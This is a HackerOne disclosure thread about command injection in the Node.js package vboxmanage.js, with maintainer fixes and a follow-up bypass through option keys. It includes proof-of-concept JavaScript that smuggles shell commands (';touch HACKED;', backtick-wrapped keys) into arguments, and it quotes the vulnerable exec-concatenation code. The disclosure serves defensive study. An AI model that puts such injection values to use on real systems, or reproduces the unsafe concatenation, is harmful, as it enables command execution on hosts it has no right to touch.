---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/node
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
date: 2020-08-20
submitted: 2020-05-02T14:21:33.264Z
bounty_usd: null
votes: 0
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/864777"
title: "[vboxmanage.js] Command Injection via insecure command concatenation"
---
# [vboxmanage.js] Command Injection via insecure command concatenation

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 0 | **Program:** Node.js third-party modules | **Disclosed:** 2020-08-20

- Report: [https://hackerone.com/reports/864777](https://hackerone.com/reports/864777)
- CWE: Command Injection - Generic
- Submitted: 2020-05-02T14:21:33.264Z

## Timeline

- **Report Filed**
- **2020-05-02** @nochnoidozor: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **External User Joined**
- **2020-07-23** @dgindi: https://github.com/danielgindi/node-vboxmanage/commit/fb0ff1f7f668c144777d3c35f1bfc5a61632e2ad
https://github.com/danielgindi/node-vboxmanage/commit/7d420aeb0edc894db304c0cf3e9d79ca024ed049
- **2020-07-23** @bbe8482aecd24374d13c5de15a0a6: Hi @danielgindi,

thanks for linking the commits for fixing the reported issue.
I'm wondering, is there a good reason why `child_process.spawn` can not be used instead of the insecure `child_process.exec` variant? We may not be aware of the reasons so I'm interested to learn them.

@d3lla can you confirm that the linked commits prevent and fix the vulnerability?
- **2020-07-24** @dgindi: This is because sometimes you actually need a shell, in case for example that you don’t know the exact path to vboxmamage.
Also the exec function can be run as a one-off, while spawn pipes the streams which again is something we have no use for here.
There are reasons these two functions exist separately, and all of those reasons are the reasons we use “exec” here :)
- **2020-07-24** @dgindi: By the way, I’ve just seen a vulnerability in this very site. When I reset the pwd, it says “this email is known to us”.
It’s dangerous to give any kind of information on whether the account exists or not, as this could narrow down hugely the attack vector.
It’s a custom now to just say that an email was sent. If the account does not exist, it was not sent but noone will ever know.
- **2020-07-24** @bbe8482aecd24374d13c5de15a0a6: > This is because sometimes you actually need a shell, in case for example that you don’t know the exact path to vboxmamage.
> Also the exec function can be run as a one-off, while spawn pipes the streams which again is something we have no use for here.
> There are reasons these two functions exist separately, and all of those reasons are the reasons we use “exec” here :)

Ok, so execFile and spawn are no options as I understood correctly. Thanks for clarifying this.

> By the way, I’ve just seen a vulnerability in this very site. When I reset the pwd, it says “this email is known to us”.

I can not confirm this, when I do this with my email address and some example one which should not exists I always get a green notification at the top that I will receive an email if there is an account for it ("If the email address is known to us, we'll send a password recovery link in a few minutes.").

Can you send me the details via email? Then I can take a look at this, check and verify this, open a report for this if this can be reproduced and invite you to it as reporter to it if you want to.

I will also check this with the HackerOne team.
- **2020-07-24** @dgindi: I missed the “If” 😂 Sorry!
- **2020-07-24** @bbe8482aecd24374d13c5de15a0a6: @danielgindi ah ok, so there is no problem with the password reset / forgot feature? Good to know and thanks for keeping an eye on this and clarifying this. The message should be probably displayed for a longer time.
- **2020-07-26** @d3lla: Hi everybody,
@danielgindi thank you for your explanation and for the fix.
I run the previous poc:
```javascript
var VBox = require('vboxmanage.js');
VBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});

```
and I was not able to reproduce the previous reported result.


However, I found a corner case (very unlikely) where it is still possible to inject commands.
If an attacker can control also the option parameters he/she can still inject commands.

Here is the poc2.js used:
```javascript
const VBox = require('vboxmanage.js');

const options =  JSON.parse('{"`touch HACKED2`" : ""}');

VBox.start(';touch HACKED1;', 'gui', options).then(function () {}).catch(function (err) {});

```

I attached a video.
{F923993}

In this case the option's keys are not sanitized:
```javascript
// https://github.com/danielgindi/node-vboxmanage/blob/master/index.js#L57
...
VBoxManage.manage = function (command, options) {

    command = command || [];
    if (!Array.isArray(command)) {
        command =  /**@type string[]*/[command];
    }

    options = options || {};

    for (let i = 0; i < command.length; i++) {
        command[i] = escapeArg(command[i]);
    }

    for (const [option, value] of Object.entries(options)) {
        command.push('--' + option); //<-- HERE

        if (value !== true) {
            command.push(escapeArg(value));
        }
    }

    if (VBoxManage.debug) {
        console.warn("$ VBoxManage " + command.join(" "));
    }

    return new Promise((resolve, reject) => {
        ChildProcess.exec(vBoxManageBinary + ' ' + command.join(' '), {}, (err, stdout, stderr) => {
            if (err) {
                err.stderr = stderr;
                return reject(err);
            }

            return resolve({stdout: stdout, stderr: stderr});
        });
    });
    ...
```

@danielgindi  and @danielruf  please let me know what do you think about that.


Thank you for your time,
d3lla


I tested using the following configurations:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.2.0
- NPM VERSION: 6.14.4
- **2020-07-26** @dgindi: I think in this case it's totally the fault of the developer using this, but we can sanitize that too for sure ;-)
- **2020-07-27** @dgindi: https://github.com/danielgindi/node-vboxmanage/commit/8efe421dd19c474cbdeb0908cbcc7aabfe343d5e
- **2020-07-29** @bbe8482aecd24374d13c5de15a0a6: Hi @danielgindi, that looks good.
Can you confirm that this resolves the second problem @d3lla?
- **2020-08-02** @d3lla: Hi @danielgindi and @danielruf,
thanks for your reply and for the fix.

I run the previous poc:
```javascript
const VBox = require('vboxmanage.js');

const options =  JSON.parse('{"`touch HACKED2`" : ""}');

VBox.start(';touch HACKED3;').then(function () {}).catch(function (err) {});
VBox.start(';touch HACKED1;', 'gui', options).then(function () {}).catch(function (err) {});

```
and I was not able to reproduce the previous reported results.

Thanks for your time and have a nice day,
d3lla

I tested using the following configurations:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.2.0
- NPM VERSION: 6.14.4
- **Report Resolved**
- **Agreed On Going Public**
- **2020-08-02** @dgindi: I've deprecated older versions. I don't see here any option to approve disclosure.
- **2020-08-02** @bbe8482aecd24374d13c5de15a0a6: As far as I know @d3lla has to accept the disclosure but I can also force the disclosure if needed.
- **Agreed On Going Public**
- **Report Became Public**
